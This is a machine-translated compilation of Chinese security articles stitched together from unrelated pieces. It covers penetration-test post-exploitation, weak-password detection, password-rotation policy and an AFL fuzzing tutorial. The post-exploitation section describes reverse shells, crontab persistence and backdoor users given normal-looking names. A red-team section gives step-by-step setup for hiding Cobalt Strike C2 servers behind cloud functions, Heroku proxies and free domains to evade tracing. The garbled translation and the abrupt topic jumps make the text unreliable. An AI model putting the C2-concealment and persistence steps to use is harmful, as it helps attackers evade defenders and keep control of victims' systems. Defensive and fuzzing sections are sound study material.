Group policies are, in part, to control what users can or cannot do on a computer, for example, implementing password complexity policies to avoid users from choosing too simple passwords, allow or prevent unidentified users from connecting to network sharing from remote computers, prevent access to Windows Task Manager or restrict access to specific folders.

Such a set of configurations is known as Group Policy Objects (Group Policy Object,GPO).

Keylogger Keylogger is divided into hardware recorder and software recorder, where the hardware recorder is the intermediate device of the keyboard access to the computer to record the information of the keyboard.

There are two types of virtual machines, Type1 Native and Type2 Hosted, where Type1 is to installing virtual machine management software on a bare machine and then virtual machine management software, while type2 refers to installing a complete operating system before installing management virtual machines on the operating system.

No matter what type of virtual machine, escape refers to the escape from the current virtual machine, to control the virtual machine management software or the host, and then to control other virtual machines or hosts.

The difference between the container security virtual machine and the container is that the virtual machine is the fully installed operating system, while the container can be understood as an application closure, and the container contains the resources and environment on which the application relies on.

The apk package can be proposed by the apktool decompression, and the extraction package can further reverse analyze the code logic.

Each application puts its own data in / data/data/[package name] in this directory, if the sensitive information exists in this directory is problematic, at least should do good encryption after stored in this directory.

MITRE has organized an iMAS project designed to protect iOS applications and data and reduce the attack surface of iOS devices and applications.

A cold start attack means that the data in the DRAM/SRAM is still readable in seconds or minutes after the device is shut down, and the memory data is read out while the memory is readable after the shutdown.

Serial Port Attack (Serial console debugging) Many devices do not authenticate the serial ports. By default, people who can physically contact the devices can configure and contact the system as long as they can connect the devices through the serial port.

The serial port may leak sensitive information, modify the boot,system configuration, and can even tamper with the firmware in the flash.

A JTAG Debugging (JTAG debugging) attacker can access registers, memory, and interruptions via a JTAG.

You can even change the execution flow of the program.

Attack operations can be performed by using software tools such as OpenOCD.

For example, take the target machine as a springboard to further Intranet test, or add a remote control Trojan, delete the intrusion log information, etc.

Common after utilization: create binding shell or rebound shel l create scheduling task create daemon create new user create backdoor upload tool perform ARP scan perform DNS and directory service enumate perform burst attack configuration port forwarding create SSH tunnel create VPN tunnel bind shell & reverse shell bind shell refers to listen to a port in the invaded device, this port and local shell process binding, the attacker only connected to execute the shell command.

reverse shell, the attacker listens to a port locally, the intrusion device actively connects the attacker's port and provides s h e l l process interaction.

Simply put is in the invaded device open port listening is bind shell, in the attacker device open port listening is rebound shell.

This is a middleware in which the attacker directly controls C2, sends commands to C2 as well as receives information to C2, and C 2 forwards the command to other controlled devices.

In the Linux environment, you can configure / etc/crontab to set up scheduled tasks.

After creating a daemon attacker invading the system, you can upload the backdoor, remotely control the Trojan to the system, and set it to the daemon start.

In addition, in order to continuously control the target system, it is also necessary to configure the process to start up, or to join the scheduling task.

After creating a new user attacker invades the system, if you can get root or administrator permission, you can add a user, with which the attacker can log in to control the invaded system.

In addition, the best added user name is very normal, it is best not to use hacker,pentest, and so on seem to be a malicious user user name, the final backdoor user's password is best configured as a strong password.

Intranet roaming (Lateral Movement), also known as springboard (Pivoting), means that an attacker invades a machine as a springboard to exploit and exploit the network in which the machine is located.

If the target network is not well isolated, there is a great threat of intranet roaming.

Remote Access protocol Remote Access is divided into two categories: terminal and UI, Terminal, such as s s h, telnet et al, While the UI is such as the Microsoft RDP, Apple Remote Desktop, VNC, X Server Desktop describes to enable remote R D P through metasploit, The previous rebound shell has been introduced to using meterpreter to connect the target system, The attacker first generates a backdoor process via msfvenom, Transfer the process to the attacked system, Local listening to the bounce shell, via msf Performing a backdoor process in the attacked system, Backash s h e l l to the attacker.

At this time, the attacker has controlled the target system through meterpreter, and executing the post-exploitationPowerShellPowerShell under windows supports very many commands, such as get-hostfix,get-command,get-process,get-service and the execution of remote script PowerSploitPowerSploit is a summary of some PowerShell scripts for some post-penetration utilization.

Remote execution can directly call the encapsulated scripts in the PowerSploit.

The general operation is to take PowerSploit clone to the attack environment and build a simple http server, like via python3-m http.The server 80, next executes the corresponding script directly and remotely.

The EmpireEmpire is another post-penetration test utilization framework.

The use of this tool is very similar to the meterpreter module of msf, first generating a payload, then turning on listening and finally payload executing on the target system allowing the attacker to control the target system.

The WMI is short for the Windows management specification.

WMI provides a rich system of management services built into Microsoft Windows operating systems that provide a full range of management capabilities in systems with a large number of applications, services, and devices.

The amount of information available through the WMI interface is amazing, including hardware settings, status information, drive configuration, BIOS information, application settings, event record information, and others.

We talked about powershell, commands such as get-command,get-process,get-service, which call the WMI interface.

Windows itself provides several WMI tools for users, including WMIC.exe、WBEMTest.Such as exe and WMI Administrative Tools, but WMI Administrative Tools seems that Microsoft no longer supports it, the website no longer supports download.

Sysinternals and PSExecSysinternals are a toolset from Microsoft that support administrators for remote control of windows hosts.

PsExec allows attackers to remotely execute programs remotely, configure the registry, etc.

For example, to open a calculator program remotely for more relevant content, please check the reference [4] clearing traces in the early interaction process. The tester should explain the process of clearing traces and environmental recovery clearly with Party A.

In general, at this stage, the checklist is as follows: Remove the account added to the test process. Remove all test files, including binaries, scripts, temporary files, etc.

In the early interaction process, please confirm with Party A to clearly restore the system configuration file as is and delete all backdoor, daemon, service, rootkits, etc.

Clear the traces must be very detailed, such as you perform an attack through msf, but there is an exception, you need to analyze what the module did, whether there is an upload script or file in the target system, these all need to be processed.

So it's better to have a staging environment(production environment / simulation environment) for the penetration tester to test, so it's easier to recover.

The test report should be constantly improved during the test process, and do not wait until the test is over to prepare the report.
Because you can write it more carefully and have more resources.

If you wait until after the test, you may miss some details, or reconfigure the environment test when trying to add information.

The dradisDradis framework is an open-source collaboration and reporting platform.

The report to the leader does not need to reflect the loophole technical details, but the report to the technical personnel requires meticulous and accurate.

Readers are advised to look at the PCI-DSS and SANS templates, both of which are very valuable.

Readers can customize their own test report templates based on these based from their own environmental background.

Generally speaking, the test report involves the following information: the final report is completed, the delivery method should also be noted, after all, the penetration test report is a highly confidential document, if the information is leaked, the consequences can be very serious.

Whether the report is provided by paper or electronic report, who the report shall be sent and in what way shall be negotiated with Party A.

It is best to add an ID to each report for easy subsequent tracking, and it is best to do a test report tracking log at which point the test report is sent to.

After Party B submits the penetration test report, Party B shall clear Party A's data to avoid information leakage to Party A's data.

The preliminary interaction table output in the early interaction phase specifies the test scope and objectives, and simultaneously outputs the test plan.

Information-collected data is presented using Dradis-like tools.

If threat modeling is performed, the threat modeling report and DFD (Data Flow Diagram) are output.

Outporting Checklist or test case in the vulnerability assessment stage is very critical, at least the use case can make Party A / owner very intuitively understand which safety problems are tested, whether it is another thing, at least through the use case can show that you did the test.

Finally, the penetration test report shows the risk of the found vulnerability points after being used.

In turn, if you are Party A and you only see a relatively simple test report, you can ask Party B to provide more materials to prove that the penetration test work coverage and test depth meet the requirements.

The web management page, public network service connection passwords (such as mail, sql, etc.), internal network terminals, server login, etc., are all the worst-hit areas of weak passwords.

Once used successfully, the loss is huge.

But weak password is actually a double-sided word invasion Angle: hackers use weak password to blasting system, implement login terminal or management system defense Angle: security personnel to prevent users to set a weak password, prevent hackers to use weak password access system permission but recall the weak password defense ideas, will obviously find the inequivalence of defense and invasion.

Defense perspective, the weak password of traditional significance refers to the password is single or too short, for example: 123456, admin,123456789, these are easy to explode, or easy to guess the password.

And you can block such weak passwords with simple policies.

However, the success rate of hackers using this password library when actually blasting is very low, and they generally need to combine the leakage of various "pants", in fact, the user has used the historical password, in addition to further improve the crack rate.

Also need to collect the social worker information, such as enterprise information: enterprise English name, enterprise Chinese name pinyin, enterprise domain name, brief / abbreviation, enterprise brand name, registration date, registration and so on personal information: see the figure below so generalized weak password database = hacker password database = (simple password + historical password + social worker password) standing in the perspective of defense, our thinking must and hackers (try to form effective defense measures, and hackers unified dimension to avoid dimension reduction, but the defense perspective should focus on the weak password database is: simple password + historical password + social worker password.

With this consensus, then we will talk about the weak password security practice of enterprise security.

This is based to prevent users from setting weak passwords and discovering weak password blasting behavior.

Simple passwords can be built in reverse, after all, Microsoft is sometimes more reliable.

Add some routines like admin, qwerty, asdfg.

Historical password, in fact, is a personal habit, here are some online can drop the pants, as follows, although they are old pants, but have a certain reference value.

Social worker password, which is very simple for enterprises. After all, when entering the company, hr needs to fill in so many information, you can refer to Figure 3 for construction.

But one thing to note is that this construction is by human, where the personal information of A builds the weak code for A, not B for B.

There is no need to overlap between information, otherwise increase password library size and little significance.

The next thing is to look at how to use this valuable data.

Generally speaking, there is no essential difference between the way for enterprises to detect weak passwords and hackers, which are to try different passwords until success.

But here are a few problems: 1, the account password verification number is limited, our weak password library has hundreds of millions, it is not in the lifetime to verify all password 2, most of the system have lock mechanism, when the verification times will lock the account, affect the user, this is also the security leadership cannot accept so we want to change a way of thinking.

We don't do the blasting, we do the comparison!This will solve the problem as the above.

Passwords are stored in the verification server, whether it is confused or encrypted, we just need to take our weak password library and password storage file to it.

However, passwords are generally not stored in plain text, MD5 plus salt is more conventional storage methods.

To solve this problem, we have to take advantage of our defenders. After all, the password encryption algorithm, we only need to convert the weak code library according to the same method, and then compare the converted weak password library.

If the same character is found in the file storing the password, it is determined that the corresponding user has a weak password.

Efficient detection of the full number of weak passwords, and if the user set the password of the non-weak password library, we can not know the user's explicit password (if one-way encryption), the belt solves the privacy problem.

Weak password blasting attacks found that no matter how we detect, we cannot prevent the hacker from performing weak password blasting behavior.

The traditional scheme is to set the threshold for the number of user verification, beyond the threshold, the alarm.

But users will also lose the wrong password, and many systems are very disabled, and they often verify the same wrong password many times, such as the AD system, which produces a lot of false positives.

In order to more accurately find the blasting behavior, we still continue to continue to take advantage of our defenders, we detect whether the user-initiated password is in our weak code library, such as the password> N in the weak code library, can be identified as blasting behavior.

This can accurately find the blasting behavior and can avoid the system bug.

In addition to a single account & multiple weak passwords, There is also a single weak password & multiple blasting of multiple accounts, This situation is generally a hacker identification that there must be a password (hacker other ways to obtain or is stubbornly think), There are two situations here: 1. A single password is in the weak password table, This one that we need to add account data to our original model, The number of accounts * weak password in the weak password table = threshold> M can be 2, a single password is not in the weak password table, This requires an independent analysis, The number of accounts using the same password> M can be summed up, We say the idea of weak cryptolibraries, The construction of weak password library, detection and weak password attack are also discussed.

Although said a lot, but in fact, said are more general, the specific landing process will certainly encounter a variety of problems, such as windows's NTLM hash password storage way.

—— Perhaps, the name of safety awareness training to "safety general education" more fits its intention.

I. The change of work thinking brought by the actual combat offensive and defense drills, with the discussion between all parties and the preliminary judgment of market supply and demand, the safety service positions in special periods are still relatively hot.

The services they can provide, such as: grooming and safety reinforcement before defense; sharp judgment and staring, duty, inspection; summary after the review, etc.
These engineers understand the general "rules of the game", to meet the temporary work requirements of the enterprise, and can assist enterprises in the operation of a safe response mechanism, is a very popular service form.

However, in the foreseeable future, offensive and defensive drills will tend to be normal and extensive, etc. Therefore, they have entered a window period where short-term security services need to be made up for regular working capabilities.

It is worth noting that, as the initiator of the policy, laws and regulations are not frequently promulgated.

Scientific research institutions or manufacturers belong to the state of flowering everywhere, such as training of offensive and defense technology, special training of fintech institute, theme training of some security manufacturers, and summary and sharing articles provided by security information, which are basically free.

The training theme is not only related to the management process, but also has some offensive and defense technology research and judgment technologies, which can basically meet the learning needs of safety practitioners.

However, in all kinds of safety compliance standards and inspection process, the safety training requirements are relatively loose, and the lack of pertinence to the safety attack and defense.

In the face of actual offensive and defense drills, internal training is often still a conventional weak password, email phishing, regulations, the experience of the industry punishment, safety accidents and other kinds of content, ordinary people do not want to listen to the second time.

Most people do not have experience in teaching or speaking; the trainer is basically science and engineering, usually not good at training PPT.

Safety training is typically set up on demand, based on cost input and lack of regulatory drive, and is usually not assessed for the individualized use of employee quantitative tools.

Through the above analysis, the author believes that the regulators, Party A enterprise and other need to accept safety related education and knowledge of personnel, party B enterprises such as scientific research, safety to provide safety training output institutions, has not formed a closed-loop management for safety education and training construction, not enough to establish a "safety education training" management branch.

Of course, regulatory agencies do not have the function of education, and can only bring safety education into the category of strong supervision, thus driving the construction of relevant work.

Other industry author have not yet thought deeply, only roughly give a few factors: whether belongs to the key infrastructure of Internet information technology, has a large number of independent research and development of emerging technology, whether the key target of domestic and foreign hackers, and other damage may affect the international cyberspace situation technology or enterprises.

These industries or units, after layers of check hired advanced information technology talents, has made achievements in specific areas, if there is no system training security architecture, risk assessment and prevention awareness, security emergency disposal such as general security, the understanding of information security if it is mainly passive listening by more basic white science, may not help much.

At the same time, some key system operation and maintenance positions, although not business research and development, but as the owner of the highest system, still need to understand some safety knowledge.

All kinds of solutions and ideas involved in the process of attack and defense drill will be constantly accumulated and precipitated, to feed back the responsible person in all links in the event disposal process;

Link personal ability improvement to remuneration to generate positive incentives;

If you only know attack or defense, there is still no guidance on the process strategy, and the security technology is not black or white. Under the regulatory framework requirements, you should also have some Geek/Hacker spirit.

Compound talents who know safety, technology and education should be absorbed to engage in related work and provide competitive treatment.

Of course, the above is only the author's feelings and imagination, the implementation of safety training still has a lot of details to consider and balance.

However, through the above discussion expectations, the safety training work should not only be led by the information security department, but also should be strengthened from the level of overall enterprise construction.

Relying on the Internet, all kinds of enterprises have moved from wild development into the deep water zone, and it may be time to open the gap with other enterprises in general education.

Safety is a lifelong learning course safety education should run throughout the development of enterprises. The regulatory authorities should increase investment in the supervision and assessment of safety education. At the same time, enterprises should also pay attention to the safety and general education of information technology talents.

Safe operation is to standardize safety work, systematic, daily, but also put forward that the operation staff need to change their ideas, not bound by the concept of safe operation and maintenance; some people put forward safe operation, also put forward safe operation, is the operation of the enterprise network security system and even the business system operation.

Even think that the biggest problem is precisely the insecurity of the operation process, operators often make the mistakes of "skilled courage", and it are these people who are unruly.

For example, a simple regular password change policy execution, if the ordinary domain user changes in three months, how will he change?How will the domain administrator change it?Good remember and complex affirmation contradiction, often will choose good remember.

Administrators face so many servers, network equipment, security equipment, how to set the password, how to manage?Human weakness will be revealed.

Safe operation should have contributed to the establishment of network security culture and the effective and efficient interaction of security system and users, but in fact, this desire is that the road is far away.

(Thank Xiaoran brother, network idle words brother) this article wants to address the password to change this topic.

I believe that so far, one of the best IT practice adopted by most enterprises must be to modify the password regularly, no matter which article, which book, whether it is CISSP or CISP, it is a mandatory code for forcing users to modify the password.

In each attack and defense drill, the user's weak password or default password often becomes the optimal solution to the attack.

The attack event caused by the weak password is really shocking, weak password, empty password, default password and clear text password was dug out one by one, involving there is no lack of enterprise important business systems and core infrastructure account security problems.

In order to solve this problem, some enterprises heavy requirements, forced employees to use 12 or even 16 password, even update the password once a month, and also set the password strategy, must conform to the case, number, special symbol complete strong password strategy, must not be used in the past 5 times password or similar password.

And undertake "whether in the end complex password", the article mentioned, as long as the password verification framework is perfect, in fact, there is no need to add password complexity requirements, so as to facilitate user memory.

The final conclusion is that as long as the hoe is waved well (the foundation is done well), the password is as long as the password is long enough, and it doesn't need to be complex enough. Are we wrong before?Well, this question is put on hold, let's look at another relevant topic, so the password regularly?It seems that for a long time, as mentioned above, we were asked to make a basic password change, but things seem to have changed. Is it really valid and meaningful?It is generally well known that human memory is limited, and when there is too much to remember, people become "smart", and they usually set a new password based on the previous password?For example, a user can attach a number to the end of the previous password and then increment or decrease that number every time the password is required.

Similarly, if you need to change a password every month, the user may merge the month name into the password, and then change the month every time you need to change the password, such as P@ssMayword1,P@ssJuneword2.

However, research has shown that if you know a user's previous password, it is likely to guess his current password."Time to rethink mandatory password changes" says the researchers conducted an experiment where they used a codset to train their crack algorithm to apply the most possible password conversion and then use it to crack the remaining passwords.

The paper contains a lot of technical details about what they did, but the end result is amazing.

Researchers at the University of North Carolina found that in 17% of the accounts they studied, they could guess the next password in less than five times after knowing the user's previous password.

An attacker who knows the previous password and has access to the hash password file, and can attack offline, can guess the current password of 41% of the account in 3 seconds.

These results suggest that attackers who have previously known the user password after forcing the user change can fairly easily guess the new password.

It seems to be a dilemma, requiring users to change the password regularly will cause problems, not asking users to change the password will also lead to problems, then do you want to change it?To know that the harm of the user sneaking into the enterprise intranet through the user password is too much greater than the so-called 0Day attack vulnerability.

0Day is only once, but if the attacker understands the law of the user's password and enters the enterprise Intranet, the harm can not be once or twice.

Another common problem blamed for password change requirements is that users forced to change passwords frequently are more likely to forget their passwords, which leads cause increased account locking and passive increased likelihood of using self-service reset passwords.

Microsoft has decided to abandon the "Password expiration Policy" from the 1903 version, please refer to the link below for details.

So just give up changing your password regularly?It is possible to give up regular password change, but as in the previous text, there is a foundation, that the password verification framework needs to be perfect enough, as long as this foundation is met, it is completely feasible not to require to change the password regularly.

When you find that you have previously tried to share your password to others, you need to change the password; when you find that you were peeping password, you need to change the password; if you find that you have had a phishing email before and may have leaked the password, you need to change the password.

Research has shown that frequently forcing users to change passwords can inconvenience users, but it cannot lead to higher security, and even less secure behavior for some users.

Encouraging users to use a long-term strong password may be safer, and of course, the best thing is to achieve password protection combined with multi-factor authentication, rather than the mandatory use of super-complex passwords and require regular modifications.

Speculation should be a recent very popular method to use a domestic B public cloud cloud function hidden attack assets.

Overall analysis is a recent method of hidden attack assets particularly favored by RT in addition to "domain front".

A domestic B public cloud cloud function forwarding is free, and the deployment cost is low, which has become a new choice.

The overall attack process is shown in the following figure: The main idea is that in the past, after the victim host runs the Trojan, through the HTTP GET and POST methods, so as to achieve continuous control.

In fact, the method of a certain B cloud forwarding in China is similar to the VPN that we usually use. B y constructing a certain B cloud function in China, the function can realize the function of forwarding and request traffic.

The final effect is to set up a layer of "transfer station" between the attack machine and the victim machine. The victim machine can only see its own traffic sent to a domestic B public cloud, so as to achieve the following purpose: let the victim machine can only see the communication with the high-trust domain name, and relax its vigilance.

Hide the I P of the CS server for the concealment of the attack assets.

Cloud servers make the connections more stable, and some server hosts with poor network condition can avoid taking the victim machine offline due to network problems.

This is actually similar to the previous domain front attack technique.
The previous domain front attack technique is: through a middleware, to hide the attack assets and confuse users through high-confidence purpose addresses.

It can only say said that the Red Team technique is really more and more, impossible to guard against.

Direct network disconnection, open only the static web service (bushi) defensive perspective attack complex now found such attacks, we looked for the relevant attack details.

Initial access requires authorization.

Click "agree to authorize" to sell your soul.

First, we choose the custom way to create, and when successful, we need to click into "Trigger Management-> Create triggers".

Someone probably asked, why create a trigger?The simple explanation is that without a trigger, your function can only be accessed by yourself. After creating a trigger, a domestic B public cloud will give you a public network API address, and each address can once trigger the function.

Still need to empower the cloud function trigger when creating the trigger.

After the success, I immediately received the notice.

Start writing the function below.

Let's simply write a function and go straight back to the page.

PS: A B public cloud cloud function has its own set of rules, a set of particularly troublesome standards and rules, I suggest you do not struggle with the details, just copy my code.

The following figure is that you first simply write a function that returns the test data, and the return format requires a very strict field such as the figure below.

Visit our cloud function address and find that the data can be returned smoothly.

So you can see what happens if I write a request method and request a fixed address, will the cloud function automatically replace my request for the target address, like a VPN or a scientific / Internet tool?So, I did it with a try.

Write the request address as our official website: you can see that after the visit, we have requested the address of our company's official website.

Here is to officially write our function.

One effect we want to achieve is to collect the package on the request side, collect the request package request data, and then send the request package as is to our CS server, and finally collect the return package of the CS server to return to the requesting party.

The specific code is as follows: The following code references the method of discarding the b '' field in the body in the Wind Start article.

Note Here is a regulation for a B public cloud cloud function that must return a dictionary with a " sBase64Encoded,statusCode,headers,body field.

Another pit is the problem of the timeout of a B public cloud cloud function.

Although we have mastered the attack methods of a B public cloud cloud function hidden in the domain front, the reference still makes us take less detours (although some pits are not avoided).

Through the domain front, a B public cloud cloud function hiding adds a layer of difficulty to trace the source, but it is not completely impossible. If you get the assistance of the relevant parties, there is a way to find the attack machine.

For example, in the front of the domain of a C public cloud cloud, as long as you find the corresponding I P of the D N S connected to a C cloud, you can get the corresponding attack IP.

A B public cloud cloud function this method, simpler, anyway, each trigger corresponding API address is one, found the line, they can not change, because the online address of CS horse fill in this.

In addition, the function name will be requested when the API deadline, if there is a little characteristic, it is not completely impossible to trace the source.

B oth sides of the attack and defense will always make common progress in the game. The recently exposed domain front attack, a B public cloud cloud function forwarding, and our latest discovery of Microsoft subdomain name hijacking, in fact, are better methods for RT to deal with various defensive tools, and we are also constantly improving the ability to detect such attacks.

Both sides should climb up each other like two vines.

From the attacker constantly scanning the scanner, the enterprise blocking the IP, to the attacker sending countless phishing emails, the enterprise conducts sample analysis and traceability, and eventually transforms into a higher offensive and defensive game.

The level of attack and defense continues to improve, after the two sides should call it "something", rather than "a few days of missing, how to pull so much".

If you can get some gains after watching it, we don't waste studying this method for a whole weekend.

Then configure the Gateway API path: Select to complete and publish tasks now.

After the configuration is complete, we get the API gateway address in the following figure: remember the address, and need to be used.

We can then go to the CS to create a listener, configure the figure below, at HTTP Hosts and HTTP Host (Stager) to fill in the just obtained API gateway address (Port must be 80).

If you specify a port in the cloud function, two listeners need to be created.

Generate a Trojan horse can be online.

Heroku Agent Hidden Real IPHeroku is a cloud platform as a service that supports multiple programming languages.

In fact, a simple understanding is through the Nginx reverse proxy way, from the heroku server proxy to our real CS server.

First of all: register the heroku account, here we need to note that the QQ mailbox and 163 and other domestic mailbox can not be registered, it is recommended to use the anonymous mailbox.

Address: https://dashboard.heroku.After com registration successfully to login, visit the following website to enter the configuration page.

Back to Cobaltstrike, configure two listeners in Cobaltstrike First listener set PAYLOAD to Beacon HTTPS,HTTPS Hosts to CS IP,HTTPS Port to port 7443 (port set in the second step).

Continue to configure the second listener and also set PAYLOAD to Beacon HTTPS,HTTPS Hosts set to huaweiapi.herokuapp.The com, the domain name of the heroku that was acquired before.

The HTTPS Port is set to 443.

(Here must be 443) When generating the Trojan, the listener is set to: the second Beacon namely: heroku2CDN hidden real IP application free domain name https://my.freenom.The com enters the xxxxxxx. directly when applyingOtherwise tk may show that the domain name is registered.

It is best to open an agent, the agent location is set in the United States (and the same nationality in the personal information), otherwise a domain name has a great probability to fail.

Simple-friendly tools such as AFL, LibFuzzer, honggfuzz also greatly reduce the threshold for fuzzy testing.

Alpha lab students in the process of recent learning vulnerability mining, feel the current online related resources are some redundant, let beginners some impossible, they want to collect in the process of learning of some excellent blog articles, papers and tools to summarize and comb, share some ideas and experience in the process of learning, at the same time to some online content to do some supplement.

Because the content is too wide, the author decided to divide all content into a series of articles, and only around AFL this landmark tool, from the most simple use method and basic concept, and then by the shallow into deep test after the follow-up work, how to improve Fuzzing speed, some use skills and the analysis of the source code content.

The workflow is roughly as follows: when compiling the program from the source to record code coverage (Code Coverage); select some input files to join the input queue (queue) as the initial test set; mutant the queue to a certain policy; if the variant file is updated, it is added to the queue; the above process is ops, and files that trigger crash are recorded.

The goal of the AFL is usually to accept programs or libraries with external input, input generally from a file (the later article also describes how to Fuzzing a network program).

AFL is mainly used for the testing of C / C + + programs, so this is the top priority rule for our search for software.

AFL can put both compile-time pins on the source and AFL's binaries, but the former is relatively more efficient and it is easy to find a lot of suitable items on Github.

If the target has ready-to-shelf basic code examples, especially some open-source libraries, it allows us to call the library without having to write another program yourself; if the target has a test case, save something to build the corpus later.

Some programs are large and will be divided into several modules, and in order to improve the Fuzz efficiency, the Fuzzing section needs to be defined before the Fuzzing.

Here recommend the source reading tool Understand,, which can visually see the project structure and scale.

For example, in the source code of the ImageMagick below, the gray box represents a folder, and the blue square represents a file, whose size and color reflect the number of rows and file complexity, respectively.

If a program has been exposed to multiple vulnerabilities, then there is still a great possibility that the program will still have an undiscovered security vulnerability.

For example, ImageMagick finds new vulnerabilities that are difficult to exploit every month, and some serious vulnerabilities with high impact occur every year, showing 357 C V E in 2017 alone.

AFL requires some initial input data as the starting point of Fuzzing, which can even be meaningless data, and AFL can automatically determine the file format structure through a heuristic algorithm.

lcamtuf gives an interesting example in the blog when —— Fuzzing djpeg with only one string "hello" as input and finally generates large numbers of jpge images out of nair!Although AFL is so powerful, it is necessary to generate a high-quality corpus to get faster Fuzzing speed, and this section addresses three problems: how to choose the input files, where to look for these files, and how to streamline the files found.

Select valid input Although sometimes invalid input can produce bug and crashes, valid input can find more execution paths faster.

Small files as small as possible can not only reduce the time of testing and processing, but also save more memory. The AFL is preferably less than 1 KB, but it can actually be weighed according to the program of your own test, which is specified in the AFL document.

Find to use the project itself provided test case target program bug commit page using format converter to generate some file formats not easy to find from existing file formats.
Some test cases of other open-source corpora are provided under the testcases directory of the afl source

Tripping some large corpora found online often contains a large number of files that need to be streamlined, and the work has a term called —— corpus Distillation (Corpus Distillation).

The core idea of removing the input file ——afl-cmin that performs the same code is to try to find a minimum subset with the same coverage as the complete corpus set.

For example: If you have multiple files, and you all cover the same code, you lose the extra files.

It is used as follows: more often, we need to get the input from the file, then we can use "" instead of the location of the file name in the input of the tested program command line.

Fuzzer replaces it with the actual executed file: In the following example, we streamline a corpus with 1,253 png files to contain only 60 files.

(2) Reduce the size of a single input file The overall size of the ——afl-tmin is improved, and each file is processed more refined.

The principle of afl-tmin reducing the volume of the file is not deeply investigated here, the opportunity will explain in the later article, here only give the use method (it is also very simple, interested friends can search by yourself).

There are two working modes, and.

The default work is, as follows: if the parameter is specified, that is, it removes the files that cause the program to abnormally exit directly.

Accept a single file input, so it can be batch processed with a simple shell script.

If the file number or file volume in the corpus is particularly large, the process can take several days or more!The following figure shows the change in corpus size after two modes: it can be used again and found that some more files can be filtered out.

As mentioned earlier, the AFL compiles the program from the source to record the code coverage.

This work requires the wrapper compiler target program using the two compilers it provide, and is not much different from the normal compilation process, and this section is a simple demonstration.

1. afl-gcc mode / as / wrapper, they use exactly the same, the former passes the received parameters to the latter, we compile the compiler only set to the compiler to / as demonstrated below.

If the program is not built with autoconf, directly modify the compiler in the file as well.

When you are Fuzzing sharing a library, you may need to write a simple demo to pass the input to the library to Fuzzing (most projects have similar demo in them).

In this case, the program can load the AFL plug by the setting.The so file, but the simplest way is static construction, through the following way: 2. LLVM mode LLVM Mode mode compiler can get faster Fuzzing speed, into the directory to compile, then use the construction sequence program, as follows: the author uses a high version of clang compilation, clang-3.9 through compilation, if your system default installed clang version is too high, you can install multiple versions and then use switch.

Starting the Fuzzing program is the main program of AFL for Fuzzing, which is not difficult to use, but the clever working principle behind it is worth studying, considering that the first article only gives readers a preliminary understanding, this section is only a simple demonstration of how to run Fuzzer, other specific details are briefly omitted here.

1. white box test (1) test the pile program compilation, you can choose to use the execution path to track a single input, and print the output executed by the program, capture the tuple (tuples), tuple to obtain branch information, to measure the program coverage, the plan will be explained in detail in the next article, here can first.

Using different inputs, capturing different tuples, normally shows that our pins work, and the previously mentioned tool to remove the duplicate input files.

(2) Execution of fuzzer If the system is configured to send the core dump file (c o r e) notification to an external program before execution.

Will cause the delay in sending crash messages to Fuzzer, and the crash may be misreported as timeout, so we have to temporarily modify the file, as follows: then you can execute, the usual format is: or use "@ @" to replace the input file, Fuzzer will replace it with the actual executed file: if there is no error, Fuzzer officially starts work.

First, preprocess the files in the input queue; then give warning information to the corpus used in, such as the figure below indicating a larger file (14.1KB) and too many input files; finally, start the Fuzz main cycle and display the status window.

A single Fuzzing process with screen usually lasts a long time, and if the terminal running the afl-fuzz instance is unexpectedly closed, the Fuzzing is also interrupted.

By starting each instance in, you can easily connect and connect.

No more to talk about the use of screen here, you can query by yourself.

You can also be named for each session for easy reconnection.

The so-called black box test, generally speaking, is to test the program without the source code, when the AFL QEMU mode will be used.

Enable is similar to LLVM mode, and also compile first.

Note however that because the Q E M U version used by AFL is too old, the function defined in conflicts with the same name in g l i b c, where patch, running the script for QEMU can automatically download the compilation.

From now on, just add options to do Fuzzing. using QEMU mode

If you have a multi-core machine, you can bind an instance to a corresponding core, that is, how few cores can run on the machine can greatly improve the execution speed.

The two types of Fuzzer perform different Fuzzing strategies, with the former performing deterministic tests, namely some specific but not random variants on the input file, and the latter performing completely random variants.

You can see that what specified here is a synchronous directory where in parallel tests all Fuzzer will collaborate with each other to pass new test cases to each other when new code paths are found.

The tool can view the running status and overall running profile of each fuzzer, plus the option to only show the profile, where the data is the sum of all fuzzer s.

The basic principle of multi-system parallelism is similar to the mechanism described in a single-system parallel and you need a simple script to do two things.

On the local system, the files in each fuzzer instance directory are compressed and distributed to other machines via SSH.

To now synchronize the input queue for each instance of fuzzer2 to fuzzer1 in the following way: after successfully executing the above shell script, not only the contents is updated, but also synchronized.

Understanding the AFL status window

① Process timing:Fuzzer runtime, and how long the recently discovered path, crash, and hang passed.

Overview of the current state of the ② Overall results:Fuzzer.

③ Cycle progress: the distance of our input queue.

Details of coverage observed in the plug code in ④ Map coverage: target binaries.

⑤ Stage progress:Fuzzer is now executing the file variation policy, execution times, and execution speed.

⑥ Findings in depth: has information about the execution path, exceptions, and the number of hangs that we have found.

⑦ Fuzzing strategy yields: details on the latest behaviour and results produced by mutation strategies.

⑧ Path geometry: information about the execution path found by Fuzzer.

So far, this article has covered how to start the Fuzzing, once, but this is just the beginning.
The Fuzzing process of AFL is a dead loop that we need to artificially stop, so when?How to verify the 18 special crashes running out in the figure above?What are also the various concepts of —— code coverage, tuples, coverage guidance, and so on?The so-called learning is not its flowers, to learn the basic use of tools, to continue to advance, to master these basic concepts is quite important, but also help to understand the deeper content.

So in the next few articles, we will first continue the unfinished work in this article, and then explain the important concepts and the principles behind the AFL in detail. Please look forward to it.

The Alpha Experiment in its last article introduced some of the preparations to do before starting fuzzy testing with AFL, and several ways the AFL works, but did not mention when to end the test process, and what needs to be done after the test is completed.

In addition to the afl-fuzz status mentioned above through the status window, afl-whatsup, several more methods are added here.

afl-stat is one of the afl-utils's AFL aids (with other better programs, introduced later), similar to afl-whatsup's output.

You can therefore be modified so that the status of the fuzzer is actually displayed.

Take the case of testing libtiff for example, go to the afl-plot output directory and open index.At html, you will see the three pictures below:  The first is the change in path coverage, when the number of pending fav becomes zero and the number of total paths is basically no longer growing, indicating that the probability of new discovery in fuzzer is very small.

This is followed by changes in crash and timeout, and finally changes in execution speed, and note here that if execution gets slower over time, there is one possibility because fuzzer consumes some of the shared resources.

The purpose of checking the afl-fuzz working status is to provide a basis for when the test is stopped, and usually when some of the following conditions are met.

The color of the field can be used as a reference for when to stop the test. As the number of cycles increases, the color gradually changes from magenta to yellow, blue and green.

When it becomes green, it is difficult to make new discoveries, and then the afl-fuzz. can be stopped through Ctrl-C

It's been a long time since the new path (or crash), and you need to know it, such as a week or longer.

